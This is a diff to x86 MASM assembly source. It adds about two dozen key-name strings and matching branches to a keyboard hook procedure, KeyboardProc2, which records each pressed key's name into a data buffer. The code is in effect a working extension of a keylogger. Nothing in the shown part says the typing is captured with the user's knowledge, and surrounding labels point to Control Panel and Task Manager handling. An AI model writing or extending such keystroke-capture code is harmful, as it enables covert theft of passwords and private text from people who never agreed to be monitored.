@@ -176,6 +176,29 @@ ReturnKey       BYTE    "Return", 0
 TabKey          BYTE    "Tab", 0
 BackSpaceKey    BYTE    "BackSpace", 0
 DeleteKey       BYTE    "Delete", 0
+SnapshotKey     BYTE    "PrintScreen", 0
+HomeKey         BYTE    "Home", 0
+EndKey          BYTE    "End", 0
+CapitalKey      BYTE    "CapsLock", 0
+NumlockKey      BYTE    "NumLock", 0
+ScrollKey       BYTE    "ScrollLock", 0
+DotKey          BYTE    ".", 0
+SemicolonKey    BYTE    ";", 0
+QuotationKey    BYTE    "'", 0
+MultiplyKey     BYTE    "*", 0
+AddKey          BYTE    "+", 0
+SubtractKey     BYTE    "-", 0
+DecimalKey      BYTE    ".", 0
+DivideKey       BYTE    "/", 0
+PauseKey        BYTE    "Pause", 0
+BackSlashKey    BYTE    "\", 0
+SlashKey        BYTE    "/", 0
+CommaKey        BYTE    ",", 0
+SimKey          BYTE    "`", 0
+LeftSquareKey   BYTE    "[", 0
+RightSquareKey  BYTE    "]", 0
+PlusEqualKey    BYTE    "=", 0
+MinusKey        BYTE    "-", 0
 
 arg_ControlPanel_1 BYTE "control",0
 arg_TaskManager_1 BYTE "open",0
@@ -904,6 +927,98 @@ KeyboardProc2   proc    uses ebx edx, nCode: DWORD, wParam: DWORD, lParam: DWORD
                                 mov     eax, OFFSET data
                                 add     eax, dataIndex
                                 invoke  crt_sprintf, eax, OFFSET DeleteKey
+                        .elseif pressed == VK_SNAPSHOT
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET SnapshotKey
+                        .elseif pressed == VK_HOME
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET HomeKey
+                        .elseif pressed == VK_END
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET EndKey
+                        .elseif pressed == VK_CAPITAL
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET CapitalKey
+                        .elseif pressed == VK_NUMLOCK
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET NumlockKey
+                        .elseif pressed == VK_SCROLL
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET ScrollKey
+                        .elseif pressed == VK_OEM_PERIOD
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET DotKey
+                        .elseif pressed == VK_OEM_1
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET SemicolonKey
+                        .elseif pressed == VK_OEM_7
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET QuotationKey
+                        .elseif pressed == VK_MULTIPLY
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET MultiplyKey
+                        .elseif pressed == VK_ADD
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET AddKey
+                        .elseif pressed == VK_SUBTRACT
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET SubtractKey
+                        .elseif pressed == VK_DECIMAL
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET DecimalKey
+                        .elseif pressed == VK_DIVIDE
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET DivideKey
+                        .elseif pressed == VK_MEDIA_PLAY_PAUSE
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET PauseKey
+                        .elseif pressed == VK_OEM_5
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET BackSlashKey
+                        .elseif pressed == VK_OEM_2
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET SlashKey
+                        .elseif pressed == VK_OEM_COMMA
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET CommaKey
+                        .elseif pressed == VK_OEM_3
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET SimKey
+                        .elseif pressed == VK_OEM_4
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET LeftSquareKey
+                        .elseif pressed == VK_OEM_6
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET RightSquareKey
+                        .elseif pressed == VK_OEM_PLUS
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET PlusEqualKey
+                        .elseif pressed == VK_OEM_MINUS
+                                mov     eax, OFFSET data
+                                add     eax, dataIndex
+                                invoke  crt_sprintf, eax, OFFSET MinusKey
                         .else
                                 mov     pressed, 0
                                 mov     eax, OFFSET data
